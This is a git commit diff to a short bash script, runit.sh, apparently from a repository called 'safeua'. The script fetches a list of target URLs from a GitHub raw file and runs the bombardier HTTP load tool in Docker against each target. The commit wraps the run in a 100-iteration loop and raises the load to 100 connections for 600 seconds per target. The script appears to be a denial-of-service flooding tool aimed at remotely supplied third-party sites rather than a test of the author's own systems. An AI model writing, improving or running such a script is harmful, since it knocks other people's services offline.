9969e9490c0e9c42e9f878d8f9efa4430ab31b94
lavals <43458274+lavals@users.noreply.github.com>
2022-03-08 14:40:44 -0800

    dry run

--- runit.sh
+++ runit.sh
@@ -1,11 +1,13 @@
 #!/bin/bash
 
+for i in {1..100};
+do 
 
-FILENAME="list.txt"
-wget -O  $FILENAME https://raw.githubusercontent.com/lavals/safeua/main/list.txt
-
-LINES=$(cat $FILENAME)
-for LINE in $LINES
-do
-    docker run -it --rm alpine/bombardier -c 10 -d 5s "$LINE"
+    FILENAME="list.txt"
+    wget -O  $FILENAME https://raw.githubusercontent.com/lavals/safeua/main/list.txt
+    LINES=$(cat $FILENAME)
+    for LINE in $LINES
+        do
+            docker run -it --rm alpine/bombardier -c 100 -d 600s -t 1s "$LINE"
+        done
 done
